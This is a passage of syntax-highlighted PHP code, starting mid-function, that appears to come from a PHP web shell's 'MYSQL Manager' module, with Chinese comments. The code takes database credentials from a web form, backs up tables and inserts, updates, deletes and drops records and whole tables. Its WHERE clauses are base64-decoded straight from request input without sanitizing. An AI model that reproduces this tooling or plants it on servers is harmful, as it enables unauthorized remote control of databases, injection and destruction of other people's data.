<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fileurl</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #f57900; font-weight: bold;">SA_ROOT</span>,<span style="color: #ad7fa8; font-style: italic;">''</span>,$<span style="color: #eeeeec;">path</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Database has success backup to &lt;a href="'</span>.$<span style="color: #eeeeec;">fileurl</span>.<span style="color: #ad7fa8; font-style: italic;">'" target="_blank"&gt;'</span>.$<span style="color: #eeeeec;">path</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">mysql_close(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Backup failed'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">insert</span> &amp;&amp; $<span style="color: #eeeeec;">insertsql</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">keystr</span> = $<span style="color: #eeeeec;">valstr</span> = $<span style="color: #eeeeec;">tmp</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">insertsql</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span> =&gt; $<span style="color: #eeeeec;">val</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">val</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">keystr</span> .= $<span style="color: #eeeeec;">tmp</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">key</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">valstr</span> .= $<span style="color: #eeeeec;">tmp</span>.<span style="color: #ad7fa8; font-style: italic;">"'"</span>.<span style="color: #eeeeec; background-color: #2e3436;">addslashes(</span>$<span style="color: #eeeeec;">val</span>).<span style="color: #ad7fa8; font-style: italic;">"'"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tmp</span> = <span style="color: #ad7fa8; font-style: italic;">','</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">keystr</span> &amp;&amp; $<span style="color: #eeeeec;">valstr</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>,$<span style="color: #eeeeec;">dbuser</span>,$<span style="color: #eeeeec;">dbpass</span>,$<span style="color: #eeeeec;">dbname</span>,$<span style="color: #eeeeec;">charset</span>,$<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(q(</span><span style="color: #ad7fa8; font-style: italic;">"INSERT INTO $tablename ($keystr) VALUES ($valstr)"</span>) ? <span style="color: #ad7fa8; font-style: italic;">'Insert new record of success'</span> : <span style="color: #eeeeec; background-color: #2e3436;">mysql_error(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">update</span> &amp;&amp; $<span style="color: #eeeeec;">insertsql</span> &amp;&amp; $<span style="color: #eeeeec;">base64</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">valstr</span> = $<span style="color: #eeeeec;">tmp</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">insertsql</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span> =&gt; $<span style="color: #eeeeec;">val</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">valstr</span> .= $<span style="color: #eeeeec;">tmp</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">key</span>.<span style="color: #ad7fa8; font-style: italic;">"='"</span>.<span style="color: #eeeeec; background-color: #2e3436;">addslashes(</span>$<span style="color: #eeeeec;">val</span>).<span style="color: #ad7fa8; font-style: italic;">"'"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tmp</span> = <span style="color: #ad7fa8; font-style: italic;">','</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">valstr</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">where</span> = <span style="color: #eeeeec; background-color: #2e3436;">base64_decode(</span>$<span style="color: #eeeeec;">base64</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>,$<span style="color: #eeeeec;">dbuser</span>,$<span style="color: #eeeeec;">dbpass</span>,$<span style="color: #eeeeec;">dbname</span>,$<span style="color: #eeeeec;">charset</span>,$<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(q(</span><span style="color: #ad7fa8; font-style: italic;">"UPDATE $tablename SET $valstr WHERE $where LIMIT 1"</span>) ? <span style="color: #ad7fa8; font-style: italic;">'Record updating'</span> : <span style="color: #eeeeec; background-color: #2e3436;">mysql_error(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'del'</span> &amp;&amp; $<span style="color: #eeeeec;">base64</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">where</span> = <span style="color: #eeeeec; background-color: #2e3436;">base64_decode(</span>$<span style="color: #eeeeec;">base64</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">delete_sql</span> = <span style="color: #ad7fa8; font-style: italic;">"DELETE FROM $tablename WHERE $where"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>,$<span style="color: #eeeeec;">dbuser</span>,$<span style="color: #eeeeec;">dbpass</span>,$<span style="color: #eeeeec;">dbname</span>,$<span style="color: #eeeeec;">charset</span>,$<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(q(</span><span style="color: #ad7fa8; font-style: italic;">"DELETE FROM $tablename WHERE $where"</span>) ? <span style="color: #ad7fa8; font-style: italic;">'Deletion record of success'</span> : <span style="color: #eeeeec; background-color: #2e3436;">mysql_error(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">tablename</span> &amp;&amp; $<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'drop'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>,$<span style="color: #eeeeec;">dbuser</span>,$<span style="color: #eeeeec;">dbpass</span>,$<span style="color: #eeeeec;">dbname</span>,$<span style="color: #eeeeec;">charset</span>,$<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"DROP TABLE $tablename"</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Drop table of success'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tablename</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(mysql_error(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'MYSQL Manager'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBHost:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbhost'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">20</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbhost</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbport'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">4</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbport</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBUser:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbuser'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">15</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbuser</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBPass:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbpass'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">15</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbpass</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBCharset:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeselect(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'charset'</span>,<span style="color: #ad7fa8; font-style: italic;">'option'</span>=&gt;$<span style="color: #eeeeec;">charsetdb</span>,<span style="color: #ad7fa8; font-style: italic;">'selected'</span>=&gt;$<span style="color: #eeeeec;">charset</span>,<span style="color: #ad7fa8; font-style: italic;">'nokey'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'connect'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Connect'</span>,<span style="color: #ad7fa8; font-style: italic;">'type'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'submit'</span>,<span style="color: #ad7fa8; font-style: italic;">'class'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'bt'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#25805;&#20316;&#35760;&#24405;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'recordlist'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'doing'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'base64'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'tablename'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">dbform</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#36873;&#23450;&#25968;&#25454;&#24211;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'setdbname'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">dbform</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">dbname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dbname'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#36873;&#23450;&#34920;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'settable'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">dbform</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'tablename'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'page'</span>,$<span style="color: #eeeeec;">page</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'doing'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">cachetables</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">pagenum</span> = <span style="color: #eeeeec; background-color: #2e3436;">30</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">page</span> = <span style="color: #eeeeec; background-color: #2e3436;">intval(</span>$<span style="color: #eeeeec;">page</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">page</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">start_limit</span> = ($<span style="color: #eeeeec;">page</span> - <span style="color: #eeeeec; background-color: #2e3436;">1</span>) * $<span style="color: #eeeeec;">pagenum</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">start_limit</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">page</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbhost</span>) &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbuser</span>) &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbpass</span>) &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">connect</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>, $<span style="color: #eeeeec;">dbuser</span>, $<span style="color: #eeeeec;">dbpass</span>, $<span style="color: #eeeeec;">dbname</span>, $<span style="color: #eeeeec;">charset</span>, $<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqlver</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_get_server_info(</span>);
